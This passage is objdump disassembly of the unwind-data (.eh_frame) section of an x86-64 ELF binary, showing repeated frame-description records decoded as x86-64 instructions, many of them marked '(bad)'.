    44e3:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    44e9:	7f 0c                	jg     44f7 <__GNU_EH_FRAME_HDR+0x2d7>
    44eb:	07                   	(bad)
    44ec:	08 00                	or     %al,(%rax)
    44ee:	00 00                	add    %al,(%rax)
    44f0:	1c 00                	sbb    $0x0,%al
    44f2:	00 00                	add    %al,(%rax)
    44f4:	7c 00                	jl     44f6 <__GNU_EH_FRAME_HDR+0x2d6>
    44f6:	00 00                	add    %al,(%rax)
    44f8:	c5 cd ff             	(bad)
    44fb:	ff 90 00 00 00 00    	call   *0x0(%rax)
    4501:	41 0e                	rex.B (bad)
    4503:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4509:	02 8b 0c 07 08 00    	add    0x8070c(%rbx),%cl
    450f:	00 1c 00             	add    %bl,(%rax,%rax,1)
    4512:	00 00                	add    %al,(%rax)
    4514:	9c                   	pushf
    4515:	00 00                	add    %al,(%rax)
    4517:	00 35 ce ff ff 12    	add    %dh,0x12ffffce(%rip)        # 130044eb <_end+0x12ffe383>
    451d:	00 00                	add    %al,(%rax)
    451f:	00 00                	add    %al,(%rax)
    4521:	41 0e                	rex.B (bad)
    4523:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4529:	4d 0c 07             	rex.WRB or $0x7,%al
    452c:	08 00                	or     %al,(%rax)
    452e:	00 00                	add    %al,(%rax)
    4530:	1c 00                	sbb    $0x0,%al
    4532:	00 00                	add    %al,(%rax)
    4534:	bc 00 00 00 27       	mov    $0x27000000,%esp
    4539:	ce                   	(bad)
    453a:	ff                   	(bad)
    453b:	ff 12                	call   *(%rdx)
    453d:	00 00                	add    %al,(%rax)
    453f:	00 00                	add    %al,(%rax)
    4541:	41 0e                	rex.B (bad)
    4543:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4549:	4d 0c 07             	rex.WRB or $0x7,%al
    454c:	08 00                	or     %al,(%rax)
    454e:	00 00                	add    %al,(%rax)
    4550:	20 00                	and    %al,(%rax)
    4552:	00 00                	add    %al,(%rax)
    4554:	dc 00                	faddl  (%rax)
    4556:	00 00                	add    %al,(%rax)
    4558:	19 ce                	sbb    %ecx,%esi
    455a:	ff                   	(bad)
    455b:	ff 4c 00 00          	decl   0x0(%rax,%rax,1)
    455f:	00 00                	add    %al,(%rax)
    4561:	41 0e                	rex.B (bad)
    4563:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4569:	41 83 03 02          	addl   $0x2,(%r11)
    456d:	46 0c 07             	rex.RX or $0x7,%al
    4570:	08 00                	or     %al,(%rax)
    4572:	00 00                	add    %al,(%rax)
    4574:	20 00                	and    %al,(%rax)
    4576:	00 00                	add    %al,(%rax)
    4578:	00 01                	add    %al,(%rcx)
    457a:	00 00                	add    %al,(%rax)
    457c:	41 ce                	rex.B (bad)
    457e:	ff                   	(bad)
    457f:	ff 52 00             	call   *0x0(%rdx)
    4582:	00 00                	add    %al,(%rax)
    4584:	00 41 0e             	add    %al,0xe(%rcx)
    4587:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    458d:	41 83 03 02          	addl   $0x2,(%r11)
    4591:	4c 0c 07             	rex.WR or $0x7,%al
    4594:	08 00                	or     %al,(%rax)
    4596:	00 00                	add    %al,(%rax)
    4598:	1c 00                	sbb    $0x0,%al
    459a:	00 00                	add    %al,(%rax)
    459c:	24 01                	and    $0x1,%al
    459e:	00 00                	add    %al,(%rax)
    45a0:	6f                   	outsl  %ds:(%rsi),(%dx)
    45a1:	ce                   	(bad)
    45a2:	ff                   	(bad)
    45a3:	ff 4f 00             	decl   0x0(%rdi)
    45a6:	00 00                	add    %al,(%rax)
    45a8:	00 41 0e             	add    %al,0xe(%rcx)
    45ab:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    45b1:	02 4a 0c             	add    0xc(%rdx),%cl
    45b4:	07                   	(bad)
    45b5:	08 00                	or     %al,(%rax)
    45b7:	00 1c 00             	add    %bl,(%rax,%rax,1)
    45ba:	00 00                	add    %al,(%rax)
    45bc:	44 01 00             	add    %r8d,(%rax)
    45bf:	00 9e ce ff ff 12    	add    %bl,0x12ffffce(%rsi)
    45c5:	00 00                	add    %al,(%rax)
    45c7:	00 00                	add    %al,(%rax)
    45c9:	41 0e                	rex.B (bad)
    45cb:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    45d1:	4d 0c 07             	rex.WRB or $0x7,%al
    45d4:	08 00                	or     %al,(%rax)
    45d6:	00 00                	add    %al,(%rax)
    45d8:	1c 00                	sbb    $0x0,%al
    45da:	00 00                	add    %al,(%rax)
    45dc:	64 01 00             	add    %eax,%fs:(%rax)
    45df:	00 90 ce ff ff 41    	add    %dl,0x41ffffce(%rax)
    45e5:	00 00                	add    %al,(%rax)
    45e7:	00 00                	add    %al,(%rax)
    45e9:	41 0e                	rex.B (bad)
    45eb:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    45f1:	7c 0c                	jl     45ff <__GNU_EH_FRAME_HDR+0x3df>
    45f3:	07                   	(bad)
    45f4:	08 00                	or     %al,(%rax)
    45f6:	00 00                	add    %al,(%rax)
    45f8:	1c 00                	sbb    $0x0,%al
    45fa:	00 00                	add    %al,(%rax)
    45fc:	84 01                	test   %al,(%rcx)
    45fe:	00 00                	add    %al,(%rax)
    4600:	b1 ce                	mov    $0xce,%cl
    4602:	ff                   	(bad)
    4603:	ff 36                	push   (%rsi)
    4605:	00 00                	add    %al,(%rax)
    4607:	00 00                	add    %al,(%rax)
    4609:	41 0e                	rex.B (bad)
    460b:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4611:	71 0c                	jno    461f <__GNU_EH_FRAME_HDR+0x3ff>
    4613:	07                   	(bad)
    4614:	08 00                	or     %al,(%rax)
    4616:	00 00                	add    %al,(%rax)
    4618:	1c 00                	sbb    $0x0,%al
    461a:	00 00                	add    %al,(%rax)
    461c:	a4                   	movsb  %ds:(%rsi),%es:(%rdi)
    461d:	01 00                	add    %eax,(%rax)
    461f:	00 c7                	add    %al,%bh
    4621:	ce                   	(bad)
    4622:	ff                   	(bad)
    4623:	ff 64 00 00          	jmp    *0x0(%rax,%rax,1)
    4627:	00 00                	add    %al,(%rax)
    4629:	41 0e                	rex.B (bad)
    462b:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4631:	02 5f 0c             	add    0xc(%rdi),%bl
    4634:	07                   	(bad)
    4635:	08 00                	or     %al,(%rax)
    4637:	00 1c 00             	add    %bl,(%rax,%rax,1)
    463a:	00 00                	add    %al,(%rax)
    463c:	c4 01 00 00          	(bad)
    4640:	0b cf                	or     %edi,%ecx
    4642:	ff                   	(bad)
    4643:	ff 72 00             	push   0x0(%rdx)
    4646:	00 00                	add    %al,(%rax)
    4648:	00 41 0e             	add    %al,0xe(%rcx)
    464b:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4651:	02 6d 0c             	add    0xc(%rbp),%ch
    4654:	07                   	(bad)
    4655:	08 00                	or     %al,(%rax)
    4657:	00 20                	add    %ah,(%rax)
    4659:	00 00                	add    %al,(%rax)
    465b:	00 e4                	add    %ah,%ah
    465d:	01 00                	add    %eax,(%rax)
    465f:	00 5d cf             	add    %bl,-0x31(%rbp)
    4662:	ff                   	(bad)
    4663:	ff                   	(bad)
    4664:	7c 01                	jl     4667 <__GNU_EH_FRAME_HDR+0x447>
    4666:	00 00                	add    %al,(%rax)
    4668:	00 41 0e             	add    %al,0xe(%rcx)
    466b:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4671:	45 83 03 03          	rex.RB addl $0x3,(%r11)
    4675:	72 01                	jb     4678 <__GNU_EH_FRAME_HDR+0x458>
    4677:	0c 07                	or     $0x7,%al
    4679:	08 00                	or     %al,(%rax)
    467b:	00 1c 00             	add    %bl,(%rax,%rax,1)
    467e:	00 00                	add    %al,(%rax)
    4680:	08 02                	or     %al,(%rdx)
    4682:	00 00                	add    %al,(%rax)
    4684:	b5 d0                	mov    $0xd0,%ch
    4686:	ff                   	(bad)
    4687:	ff 58 00             	lcall  *0x0(%rax)
    468a:	00 00                	add    %al,(%rax)
    468c:	00 41 0e             	add    %al,0xe(%rcx)
    468f:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4695:	02 53 0c             	add    0xc(%rbx),%dl
    4698:	07                   	(bad)
    4699:	08 00                	or     %al,(%rax)
    469b:	00 1c 00             	add    %bl,(%rax,%rax,1)
    469e:	00 00                	add    %al,(%rax)
    46a0:	28 02                	sub    %al,(%rdx)
    46a2:	00 00                	add    %al,(%rax)
    46a4:	ed                   	in     (%dx),%eax
    46a5:	d0 ff                	sar    %bh
    46a7:	ff                   	(bad)
    46a8:	bd 00 00 00 00       	mov    $0x0,%ebp
    46ad:	41 0e                	rex.B (bad)
    46af:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    46b5:	02 b8 0c 07 08 00    	add    0x8070c(%rax),%bh
    46bb:	00 1c 00             	add    %bl,(%rax,%rax,1)
    46be:	00 00                	add    %al,(%rax)
    46c0:	48 02 00             	rex.W add (%rax),%al
    46c3:	00 8a d1 ff ff 75    	add    %cl,0x75ffffd1(%rdx)
    46c9:	00 00                	add    %al,(%rax)
    46cb:	00 00                	add    %al,(%rax)
    46cd:	41 0e                	rex.B (bad)
    46cf:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    46d5:	02 70 0c             	add    0xc(%rax),%dh
    46d8:	07                   	(bad)
    46d9:	08 00                	or     %al,(%rax)
    46db:	00 1c 00             	add    %bl,(%rax,%rax,1)
    46de:	00 00                	add    %al,(%rax)
    46e0:	68 02 00 00 df       	push   $0xffffffffdf000002
    46e5:	d1 ff                	sar    %edi
    46e7:	ff 62 00             	jmp    *0x0(%rdx)
    46ea:	00 00                	add    %al,(%rax)
    46ec:	00 41 0e             	add    %al,0xe(%rcx)
    46ef:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    46f5:	02 5d 0c             	add    0xc(%rbp),%bl
    46f8:	07                   	(bad)
    46f9:	08 00                	or     %al,(%rax)
    46fb:	00 1c 00             	add    %bl,(%rax,%rax,1)
    46fe:	00 00                	add    %al,(%rax)
    4700:	88 02                	mov    %al,(%rdx)
    4702:	00 00                	add    %al,(%rax)
    4704:	21 d2                	and    %edx,%edx
    4706:	ff                   	(bad)
    4707:	ff cd                	dec    %ebp
    4709:	00 00                	add    %al,(%rax)
    470b:	00 00                	add    %al,(%rax)
    470d:	41 0e                	rex.B (bad)
    470f:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4715:	02 c8                	add    %al,%cl
    4717:	0c 07                	or     $0x7,%al
    4719:	08 00                	or     %al,(%rax)
    471b:	00 1c 00             	add    %bl,(%rax,%rax,1)
    471e:	00 00                	add    %al,(%rax)
    4720:	a8 02                	test   $0x2,%al
    4722:	00 00                	add    %al,(%rax)
    4724:	ce                   	(bad)
    4725:	d2 ff                	sar    %cl,%bh
    4727:	ff 25 01 00 00 00    	jmp    *0x1(%rip)        # 472e <__GNU_EH_FRAME_HDR+0x50e>
    472d:	41 0e                	rex.B (bad)
    472f:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4735:	03 20                	add    (%rax),%esp
    4737:	01 0c 07             	add    %ecx,(%rdi,%rax,1)
    473a:	08 00                	or     %al,(%rax)
    473c:	1c 00                	sbb    $0x0,%al
    473e:	00 00                	add    %al,(%rax)
    4740:	c8 02 00 00          	enter  $0x2,$0x0
    4744:	d3 d3                	rcl    %cl,%ebx
    4746:	ff                   	(bad)
    4747:	ff 9b 00 00 00 00    	lcall  *0x0(%rbx)
    474d:	41 0e                	rex.B (bad)
    474f:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4755:	02 96 0c 07 08 00    	add    0x8070c(%rsi),%dl
    475b:	00 1c 00             	add    %bl,(%rax,%rax,1)
    475e:	00 00                	add    %al,(%rax)
    4760:	e8 02 00 00 4e       	call   4e004767 <_end+0x4dffe5ff>
    4765:	d4                   	(bad)
    4766:	ff                   	(bad)
    4767:	ff 16                	call   *(%rsi)
    4769:	01 00                	add    %eax,(%rax)
    476b:	00 00                	add    %al,(%rax)
    476d:	41 0e                	rex.B (bad)
    476f:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4775:	03 11                	add    (%rcx),%edx
    4777:	01 0c 07             	add    %ecx,(%rdi,%rax,1)
    477a:	08 00                	or     %al,(%rax)
    477c:	1c 00                	sbb    $0x0,%al
    477e:	00 00                	add    %al,(%rax)
    4780:	08 03                	or     %al,(%rbx)
    4782:	00 00                	add    %al,(%rax)
    4784:	44 d5                	rex.R (bad)
    4786:	ff                   	(bad)
    4787:	ff 1f                	lcall  *(%rdi)
    4789:	02 00                	add    (%rax),%al
    478b:	00 00                	add    %al,(%rax)
    478d:	41 0e                	rex.B (bad)
    478f:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4795:	03 1a                	add    (%rdx),%ebx
    4797:	02 0c 07             	add    (%rdi,%rax,1),%cl
    479a:	08 00                	or     %al,(%rax)
    479c:	1c 00                	sbb    $0x0,%al
    479e:	00 00                	add    %al,(%rax)
    47a0:	28 03                	sub    %al,(%rbx)
    47a2:	00 00                	add    %al,(%rax)
    47a4:	43 d7                	rex.XB xlat %ds:(%rbx)
    47a6:	ff                   	(bad)
    47a7:	ff 35 00 00 00 00    	push   0x0(%rip)        # 47ad <__GNU_EH_FRAME_HDR+0x58d>
    47ad:	41 0e                	rex.B (bad)
    47af:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    47b5:	70 0c                	jo     47c3 <__GNU_EH_FRAME_HDR+0x5a3>
    47b7:	07                   	(bad)
    47b8:	08 00                	or     %al,(%rax)
    47ba:	00 00                	add    %al,(%rax)
    47bc:	1c 00                	sbb    $0x0,%al
    47be:	00 00                	add    %al,(%rax)
    47c0:	48 03 00             	add    (%rax),%rax
    47c3:	00 58 d7             	add    %bl,-0x29(%rax)
    47c6:	ff                   	(bad)
    47c7:	ff 20                	jmp    *(%rax)
    47c9:	00 00                	add    %al,(%rax)
    47cb:	00 00                	add    %al,(%rax)
    47cd:	41 0e                	rex.B (bad)
    47cf:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    47d5:	5b                   	pop    %rbx
    47d6:	0c 07                	or     $0x7,%al
    47d8:	08 00                	or     %al,(%rax)
    47da:	00 00                	add    %al,(%rax)
    47dc:	1c 00                	sbb    $0x0,%al
    47de:	00 00                	add    %al,(%rax)
    47e0:	68 03 00 00 58       	push   $0x58000003
    47e5:	d7                   	xlat   %ds:(%rbx)
    47e6:	ff                   	(bad)
    47e7:	ff                   	(bad)
    47e8:	78 00                	js     47ea <__GNU_EH_FRAME_HDR+0x5ca>
    47ea:	00 00                	add    %al,(%rax)
    47ec:	00 41 0e             	add    %al,0xe(%rcx)
    47ef:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    47f5:	02 73 0c             	add    0xc(%rbx),%dh
    47f8:	07                   	(bad)
    47f9:	08 00                	or     %al,(%rax)
    47fb:	00 1c 00             	add    %bl,(%rax,%rax,1)
    47fe:	00 00                	add    %al,(%rax)
    4800:	88 03                	mov    %al,(%rbx)
    4802:	00 00                	add    %al,(%rax)
    4804:	b0 d7                	mov    $0xd7,%al
    4806:	ff                   	(bad)
    4807:	ff 57 00             	call   *0x0(%rdi)
    480a:	00 00                	add    %al,(%rax)
    480c:	00 41 0e             	add    %al,0xe(%rcx)
    480f:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4815:	02 52 0c             	add    0xc(%rdx),%dl
    4818:	07                   	(bad)
    4819:	08 00                	or     %al,(%rax)
    481b:	00 20                	add    %ah,(%rax)
    481d:	00 00                	add    %al,(%rax)
    481f:	00 a8 03 00 00 e7    	add    %ch,-0x18fffffd(%rax)
    4825:	d7                   	xlat   %ds:(%rbx)
    4826:	ff                   	(bad)
    4827:	ff a1 00 00 00 00    	jmp    *0x0(%rcx)
    482d:	41 0e                	rex.B (bad)
    482f:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4835:	45 83 03 02          	rex.RB addl $0x2,(%r11)
    4839:	97                   	xchg   %eax,%edi
    483a:	0c 07                	or     $0x7,%al
    483c:	08 00                	or     %al,(%rax)
    483e:	00 00                	add    %al,(%rax)
    4840:	1c 00                	sbb    $0x0,%al
    4842:	00 00                	add    %al,(%rax)
    4844:	cc                   	int3
    4845:	03 00                	add    (%rax),%eax
    4847:	00 64 d8 ff          	add    %ah,-0x1(%rax,%rbx,8)
    484b:	ff 5d 00             	lcall  *0x0(%rbp)
    484e:	00 00                	add    %al,(%rax)
    4850:	00 41 0e             	add    %al,0xe(%rcx)
    4853:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4859:	02 58 0c             	add    0xc(%rax),%bl
    485c:	07                   	(bad)
    485d:	08 00                	or     %al,(%rax)
    485f:	00 1c 00             	add    %bl,(%rax,%rax,1)
    4862:	00 00                	add    %al,(%rax)
    4864:	ec                   	in     (%dx),%al
    4865:	03 00                	add    (%rax),%eax
    4867:	00 a1 d8 ff ff 31    	add    %ah,0x31ffffd8(%rcx)
    486d:	01 00                	add    %eax,(%rax)
    486f:	00 00                	add    %al,(%rax)
    4871:	41 0e                	rex.B (bad)
    4873:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4879:	03 2c 01             	add    (%rcx,%rax,1),%ebp
    487c:	0c 07                	or     $0x7,%al
    487e:	08 00                	or     %al,(%rax)
    4880:	1c 00                	sbb    $0x0,%al
    4882:	00 00                	add    %al,(%rax)
    4884:	0c 04                	or     $0x4,%al
    4886:	00 00                	add    %al,(%rax)
    4888:	b2 d9                	mov    $0xd9,%dl
    488a:	ff                   	(bad)
    488b:	ff b7 00 00 00 00    	push   0x0(%rdi)
    4891:	41 0e                	rex.B (bad)
    4893:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4899:	02 b2 0c 07 08 00    	add    0x8070c(%rdx),%dh
    489f:	00 1c 00             	add    %bl,(%rax,%rax,1)
    48a2:	00 00                	add    %al,(%rax)
    48a4:	2c 04                	sub    $0x4,%al
    48a6:	00 00                	add    %al,(%rax)
    48a8:	49 da ff             	rex.WB (bad)
    48ab:	ff                   	(bad)
    48ac:	de 00                	fiadds (%rax)
    48ae:	00 00                	add    %al,(%rax)
    48b0:	00 41 0e             	add    %al,0xe(%rcx)
    48b3:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    48b9:	02 d9                	add    %cl,%bl
    48bb:	0c 07                	or     $0x7,%al
    48bd:	08 00                	or     %al,(%rax)
    48bf:	00 1c 00             	add    %bl,(%rax,%rax,1)
    48c2:	00 00                	add    %al,(%rax)
    48c4:	4c 04 00             	rex.WR add $0x0,%al
    48c7:	00 07                	add    %al,(%rdi)
    48c9:	db ff                	(bad)
    48cb:	ff 4c 00 00          	decl   0x0(%rax,%rax,1)
    48cf:	00 00                	add    %al,(%rax)
    48d1:	41 0e                	rex.B (bad)
    48d3:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    48d9:	02 47 0c             	add    0xc(%rdi),%al
    48dc:	07                   	(bad)
    48dd:	08 00                	or     %al,(%rax)
    48df:	00 1c 00             	add    %bl,(%rax,%rax,1)
    48e2:	00 00                	add    %al,(%rax)
    48e4:	6c                   	insb   (%dx),%es:(%rdi)
    48e5:	04 00                	add    $0x0,%al
    48e7:	00 33                	add    %dh,(%rbx)
    48e9:	db ff                	(bad)
    48eb:	ff 10                	call   *(%rax)
    48ed:	00 00                	add    %al,(%rax)
    48ef:	00 00                	add    %al,(%rax)
    48f1:	41 0e                	rex.B (bad)
    48f3:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    48f9:	4b 0c 07             	rex.WXB or $0x7,%al
    48fc:	08 00                	or     %al,(%rax)
    48fe:	00 00                	add    %al,(%rax)
    4900:	1c 00                	sbb    $0x0,%al
    4902:	00 00                	add    %al,(%rax)
    4904:	8c 04 00             	mov    %es,(%rax,%rax,1)
    4907:	00 23                	add    %ah,(%rbx)
    4909:	db ff                	(bad)
    490b:	ff                   	(bad)
    490c:	7f 00                	jg     490e <__GNU_EH_FRAME_HDR+0x6ee>
    490e:	00 00                	add    %al,(%rax)
    4910:	00 41 0e             	add    %al,0xe(%rcx)
    4913:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4919:	02 7a 0c             	add    0xc(%rdx),%bh
    491c:	07                   	(bad)
    491d:	08 00                	or     %al,(%rax)
    491f:	00 1c 00             	add    %bl,(%rax,%rax,1)
    4922:	00 00                	add    %al,(%rax)
    4924:	ac                   	lods   %ds:(%rsi),%al
    4925:	04 00                	add    $0x0,%al
    4927:	00 82 db ff ff 4d    	add    %al,0x4dffffdb(%rdx)
    492d:	00 00                	add    %al,(%rax)
    492f:	00 00                	add    %al,(%rax)
    4931:	41 0e                	rex.B (bad)
    4933:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4939:	02 48 0c             	add    0xc(%rax),%cl
    493c:	07                   	(bad)
    493d:	08 00                	or     %al,(%rax)
    493f:	00 1c 00             	add    %bl,(%rax,%rax,1)
    4942:	00 00                	add    %al,(%rax)
    4944:	cc                   	int3
    4945:	04 00                	add    $0x0,%al
    4947:	00 af db ff ff 85    	add    %ch,-0x7a000025(%rdi)
    494d:	00 00                	add    %al,(%rax)
    494f:	00 00                	add    %al,(%rax)
    4951:	41 0e                	rex.B (bad)
    4953:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4959:	02 80 0c 07 08 00    	add    0x8070c(%rax),%al
    495f:	00 1c 00             	add    %bl,(%rax,%rax,1)
    4962:	00 00                	add    %al,(%rax)
    4964:	ec                   	in     (%dx),%al
    4965:	04 00                	add    $0x0,%al
    4967:	00 14 dc             	add    %dl,(%rsp,%rbx,8)
    496a:	ff                   	(bad)
    496b:	ff 44 00 00          	incl   0x0(%rax,%rax,1)
    496f:	00 00                	add    %al,(%rax)
    4971:	41 0e                	rex.B (bad)
    4973:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4979:	7f 0c                	jg     4987 <__GNU_EH_FRAME_HDR+0x767>
    497b:	07                   	(bad)
    497c:	08 00                	or     %al,(%rax)
    497e:	00 00                	add    %al,(%rax)
    4980:	1c 00                	sbb    $0x0,%al
    4982:	00 00                	add    %al,(%rax)
    4984:	0c 05                	or     $0x5,%al
    4986:	00 00                	add    %al,(%rax)
    4988:	38 dc                	cmp    %bl,%ah
    498a:	ff                   	(bad)
    498b:	ff 90 00 00 00 00    	call   *0x0(%rax)
    4991:	41 0e                	rex.B (bad)
    4993:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4999:	02 8b 0c 07 08 00    	add    0x8070c(%rbx),%cl
    499f:	00 1c 00             	add    %bl,(%rax,%rax,1)
    49a2:	00 00                	add    %al,(%rax)
    49a4:	2c 05                	sub    $0x5,%al
    49a6:	00 00                	add    %al,(%rax)
    49a8:	a8 dc                	test   $0xdc,%al
    49aa:	ff                   	(bad)
    49ab:	ff 12                	call   *(%rdx)
    49ad:	00 00                	add    %al,(%rax)
    49af:	00 00                	add    %al,(%rax)
    49b1:	41 0e                	rex.B (bad)
    49b3:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    49b9:	4d 0c 07             	rex.WRB or $0x7,%al
    49bc:	08 00                	or     %al,(%rax)
    49be:	00 00                	add    %al,(%rax)
    49c0:	1c 00                	sbb    $0x0,%al
    49c2:	00 00                	add    %al,(%rax)
    49c4:	4c 05 00 00 9a dc    	rex.WR add $0xffffffffdc9a0000,%rax
    49ca:	ff                   	(bad)
    49cb:	ff 12                	call   *(%rdx)
    49cd:	00 00                	add    %al,(%rax)
    49cf:	00 00                	add    %al,(%rax)
    49d1:	41 0e                	rex.B (bad)
    49d3:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    49d9:	4d 0c 07             	rex.WRB or $0x7,%al
    49dc:	08 00                	or     %al,(%rax)
    49de:	00 00                	add    %al,(%rax)
    49e0:	20 00                	and    %al,(%rax)
    49e2:	00 00                	add    %al,(%rax)
    49e4:	6c                   	insb   (%dx),%es:(%rdi)
    49e5:	05 00 00 8c dc       	add    $0xdc8c0000,%eax
    49ea:	ff                   	(bad)
    49eb:	ff 4c 00 00          	decl   0x0(%rax,%rax,1)
    49ef:	00 00                	add    %al,(%rax)
    49f1:	41 0e                	rex.B (bad)
    49f3:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    49f9:	41 83 03 02          	addl   $0x2,(%r11)
    49fd:	46 0c 07             	rex.RX or $0x7,%al
    4a00:	08 00                	or     %al,(%rax)
    4a02:	00 00                	add    %al,(%rax)
    4a04:	20 00                	and    %al,(%rax)
    4a06:	00 00                	add    %al,(%rax)
    4a08:	90                   	nop
    4a09:	05 00 00 b4 dc       	add    $0xdcb40000,%eax
    4a0e:	ff                   	(bad)
    4a0f:	ff 52 00             	call   *0x0(%rdx)
    4a12:	00 00                	add    %al,(%rax)
    4a14:	00 41 0e             	add    %al,0xe(%rcx)
    4a17:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4a1d:	41 83 03 02          	addl   $0x2,(%r11)
    4a21:	4c 0c 07             	rex.WR or $0x7,%al
    4a24:	08 00                	or     %al,(%rax)
    4a26:	00 00                	add    %al,(%rax)
    4a28:	1c 00                	sbb    $0x0,%al
    4a2a:	00 00                	add    %al,(%rax)
    4a2c:	b4 05                	mov    $0x5,%ah
    4a2e:	00 00                	add    %al,(%rax)
    4a30:	e2 dc                	loop   4a0e <__GNU_EH_FRAME_HDR+0x7ee>
    4a32:	ff                   	(bad)
    4a33:	ff 4f 00             	decl   0x0(%rdi)
    4a36:	00 00                	add    %al,(%rax)
    4a38:	00 41 0e             	add    %al,0xe(%rcx)
    4a3b:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4a41:	02 4a 0c             	add    0xc(%rdx),%cl
    4a44:	07                   	(bad)
    4a45:	08 00                	or     %al,(%rax)
    4a47:	00 1c 00             	add    %bl,(%rax,%rax,1)
    4a4a:	00 00                	add    %al,(%rax)
    4a4c:	d4                   	(bad)
    4a4d:	05 00 00 11 dd       	add    $0xdd110000,%eax
    4a52:	ff                   	(bad)
    4a53:	ff 12                	call   *(%rdx)
    4a55:	00 00                	add    %al,(%rax)
    4a57:	00 00                	add    %al,(%rax)
    4a59:	41 0e                	rex.B (bad)
    4a5b:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4a61:	4d 0c 07             	rex.WRB or $0x7,%al
    4a64:	08 00                	or     %al,(%rax)
    4a66:	00 00                	add    %al,(%rax)
    4a68:	1c 00                	sbb    $0x0,%al
    4a6a:	00 00                	add    %al,(%rax)
    4a6c:	f4                   	hlt
    4a6d:	05 00 00 03 dd       	add    $0xdd030000,%eax
    4a72:	ff                   	(bad)
    4a73:	ff 41 00             	incl   0x0(%rcx)
    4a76:	00 00                	add    %al,(%rax)
    4a78:	00 41 0e             	add    %al,0xe(%rcx)
    4a7b:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4a81:	7c 0c                	jl     4a8f <__GNU_EH_FRAME_HDR+0x86f>
    4a83:	07                   	(bad)
    4a84:	08 00                	or     %al,(%rax)
    4a86:	00 00                	add    %al,(%rax)
    4a88:	1c 00                	sbb    $0x0,%al
    4a8a:	00 00                	add    %al,(%rax)
    4a8c:	14 06                	adc    $0x6,%al
    4a8e:	00 00                	add    %al,(%rax)
    4a90:	24 dd                	and    $0xdd,%al
    4a92:	ff                   	(bad)
    4a93:	ff 36                	push   (%rsi)
    4a95:	00 00                	add    %al,(%rax)
    4a97:	00 00                	add    %al,(%rax)
    4a99:	41 0e                	rex.B (bad)
    4a9b:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4aa1:	71 0c                	jno    4aaf <__GNU_EH_FRAME_HDR+0x88f>
    4aa3:	07                   	(bad)
    4aa4:	08 00                	or     %al,(%rax)
    4aa6:	00 00                	add    %al,(%rax)
    4aa8:	1c 00                	sbb    $0x0,%al
    4aaa:	00 00                	add    %al,(%rax)
    4aac:	34 06                	xor    $0x6,%al
    4aae:	00 00                	add    %al,(%rax)
    4ab0:	3a dd                	cmp    %ch,%bl
    4ab2:	ff                   	(bad)
    4ab3:	ff 64 00 00          	jmp    *0x0(%rax,%rax,1)
    4ab7:	00 00                	add    %al,(%rax)
    4ab9:	41 0e                	rex.B (bad)
    4abb:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4ac1:	02 5f 0c             	add    0xc(%rdi),%bl
    4ac4:	07                   	(bad)
    4ac5:	08 00                	or     %al,(%rax)
    4ac7:	00 1c 00             	add    %bl,(%rax,%rax,1)
    4aca:	00 00                	add    %al,(%rax)
    4acc:	54                   	push   %rsp
    4acd:	06                   	(bad)
    4ace:	00 00                	add    %al,(%rax)
    4ad0:	7e dd                	jle    4aaf <__GNU_EH_FRAME_HDR+0x88f>
    4ad2:	ff                   	(bad)
    4ad3:	ff 72 00             	push   0x0(%rdx)
    4ad6:	00 00                	add    %al,(%rax)
    4ad8:	00 41 0e             	add    %al,0xe(%rcx)
    4adb:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4ae1:	02 6d 0c             	add    0xc(%rbp),%ch
    4ae4:	07                   	(bad)
    4ae5:	08 00                	or     %al,(%rax)
    4ae7:	00 20                	add    %ah,(%rax)
